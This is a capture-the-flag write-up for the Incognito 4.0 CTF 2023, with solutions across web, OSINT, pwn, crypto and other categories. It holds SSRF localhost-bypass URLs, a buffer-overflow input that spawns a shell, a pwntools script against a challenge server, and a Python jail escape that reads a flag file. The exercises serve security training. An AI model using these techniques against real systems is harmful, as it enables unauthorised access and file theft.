# Incognito 4.0 CTF 2023

Platz 30 von ~300

## Web 

### Low On Options

http://143.42.131.240:3000/

* Es gibt keine /robots.txt und keine /flag oder /flag.txt
* Port 3001 oder 80 sind nicht besetzt
* In der HTTP-Antwort auch noch nichts gefunden, ETag sieht komisch aus, weiß aber auch nich was das ist.
* Kein Zertifikart da HTTP

Kein Ergebniss:
```shell
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt \
--hc 404 http://143.42.131.240:3000/FUZZ
```

### Get Flag 1 

http://45.79.210.216:5000/

* Need to get a flag at :9001/flag.txt
* localhost:9001/flag oder 0.0.0.0 haben in dem Formular nicht funktioniert, gibt immer einen 500 Fehler.
* Andere Seiten funktionieren auch nicht.
* Server-Side-Request-Forgery

Solution: http://0.0.0.0:9001/flag.txt

ictf{l0c4l_byp4$$_323theu0a9} 

### Get Flag 2

http://45.79.216.81:5000/

* Flag wieder bei :9001/flag.txt
* http://0.0.0.0:9001/flag.txt oder localhost geht nicht
* smb:// auch nicht
* http://127.0.0.1:9001/flag.txt lässt ihn lange laden ... auch 500
auch ipv6 local nicht

Solution: http://[0000:0000:0000:0000:0000:0000:0000:0001]:9001/flag.txt


ictf{ch3ck_1p_v6_cr239eatf21} 

### Massive

Nur /login als Ergebniss
```shell
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt \
--hc 404 http://143.42.131.80:1337/FUZZ
```

## OSINT 

### Gaining Insight

Target-Info: kristen@kristenchavis.com

* Die Domain ist nicht registriert
* Es gibt keinen offensichltichen treffer bei Google mit der Email in "".

Found: https://github.com/kristenchavis01/resume

She uploaded a profile picture as an asset on overfleaf.com

https://www.overleaf.com/project/63ea33369011ed0787115818

Download the image and run stegcracker on it with rockyou.txt

ictf{av01d_th3_z1p_b0mb_87ad2th}


### Find IP

You can find a known_hosts file in her GitHub repository. That file contains the ip of the target.

https://github.com/kristenchavis01/dotfiles/blob/main/.ssh/known_hosts

```!
170.187.232.216 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPY2c6B/GO4EfIczGPwtdZWn1ml0eoDPOtX7hQ8cWzcK
```

ictf{170.187.232.216}

## REV

### Meow

```
cat meow
```

ictf{easiest_challenge_of_them_all}


## PWN

### BabyFlow

* Statically compiled executable
* not stripped
* found `vulnerable_function` in decompiler
* we can overwrite the return pointer after 24 bytes
* this launches a shell for us

```
BBBBBBBBBBBBBBBBBBBBBBBB\n\xfc\x91\x04\x08\ncat /home/ctf/flag && echo ""\n
```

ictf{bf930bcd-6c10-4c05-bdd8-435db4b50cdb}

### GainMe

Open in Cutter and reverse the functions by debugging them.

```python
from pwn import *
import pwnlib.tubes.remote

context.log_level = 'info'

conn = remote('143.198.219.171', 5003)
#conn = process('/home/incognitoctf2023/challenges/pwn/Gainme')

print(conn.recvuntil(b'Enter input for Level 0:'))
conn.send(b'ICTF4\n')

print(conn.recvuntil(b'Enter input for Level 1:'))
conn.send(b'dasDASQWgjtrkodsc\n')

print(conn.recvuntil(b'Enter input for Level 2:'))
conn.send(b'\xef\xbe\xad\xde\n')

print(conn.recvuntil(b'Enter input for Level 3:'))
conn.send(b'001\n')

print(conn.recvline())
print(conn.recvuntil("}"))

```

```bash
echo -e "ICTF4\ndasDASQWgjtrkodsc\n\xef\xbe\xad\xde\n001"
```

ictf{g@inm3-sf23f-4fd2150cd33db}


## Sanity

### More Sanity

Write `!flag` to the bot in private chat. 

ictf{!flag_work5??_p718jq091}

## Crypto

### Crypto1

Just brute force the combinations

```php
<?php

$solution = file_get_contents('result');

$input = "";

function func($f, $i) {
    if ($i < 5) {
        $out = ord($f) ^ 0x76 ^ 0xAD;
        $var1 = ($out & 0xAA) >> 1;
        $var2 = 2 * $out & 0xAA;
        return $var1 | $var2;
    } else if ($i >= 5 && $i < 10) {
        $out = ord($f) ^ 0x76 ^ 0xBE;
        $var1 = ($out & 0xCC) >> 2;
        $var2 = 4 * $out & 0xCC;
        return $var1 | $var2;
    } else {
        $out = ord($f) ^ 0x76 ^ 0xEF;
        $var1 = ($out & 0xF0) >> 4;
        $var2 = 16 * $out & 0xF0;
        return $var1 | $var2;
    }
}

$result = '';

$chrArray = preg_split('//u', $solution, -1, PREG_SPLIT_NO_EMPTY);

for ($i = 0; $i < count($chrArray); $i++) {
    for ($j = 32; $j < 127; $j++) {
        $try = mb_chr(func(chr($j), $i));
        
        if (strlen($chrArray[$i]) === 2) {
            if ($try[0] === $chrArray[$i][0] && $try[1] === $chrArray[$i][1]) {
                $result .= chr($j);
                break;
            }   
        } else {
            if ($try[0] === $chrArray[$i][0]) {
                $result .= chr($j);
                break;
            }
        }
    }
}

echo bin2hex($solution) . PHP_EOL;
echo $result . PHP_EOL;
echo '=======================' . PHP_EOL;

```

ictf{88f30d1cd1ab443}

### Ancient

1. Repair PNG with missing header fields
2. Decode monk numerals from image (https://www.dcode.fr/cistercian-numbers)

Resulting integer values from monk numerals:

```
105
99
116
102
123
48
108
100
95
109
48
110
107
95
49
57
48
100
101
49
99
51
125
```

Into ASCII:

ictf{0ld_m0nk_190de1c3}

### PyJail

* connect with nc
* you'll get a python shell
* cannot ue `/`, use `a = chr(47)` instead

```python
import os

arr = os.listdir()

print(arr)

dortei = open(a + "home" + a + "ctf" + a + "flag.txt")
content = dortei.read()
print(content)
```

ictf{ff8ab219-a90b-44f8-9273-ccc13766f2eb}

## Tools

The one true love: https://gchq.github.io/CyberChef/
Exploit Example Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings
Wordlists: https://github.com/danielmiessler/SecLists

### Stego

For the easy stego challenges: https://futureboy.us/stegano/
Geil: https://stegonline.georgeom.net/image

### Web

HTTP Dump: https://beeceptor.com/
SQLInjection: https://sqlmap.org/
noSQL Injection: https://github.com/codingo/NoSQLMap
SSL-Configurator: https://ssl-config.mozilla.org/
SSL-Analyzer: https://www.ssllabs.com/ssltest/analyze.html
Requested Certificate Finder: https://crt.sh
JSON Web Token Stuff: https://jwt.io/
XSS Tools: https://beefproject.com/

### Binary

x86/amd64 InsSet: http://ref.x86asm.net/coder64.html
Online Disassembler: https://onlinedisassembler.com/odaweb/

### Audio

https://github.com/kamalmostafa/minimodem
https://github.com/gnuradio/gnuradio
https://github.com/xdsopl/robot36 (SSTV Signal)

### Wireshark

USB Spec: https://usb.org/sites/default/files/hut1_21_0.pdf#page=83

### Privilege Escalation 

PEASS
https://github.com/carlospolop/PEASS-ng

### OSINT

https://www.osintdojo.com/
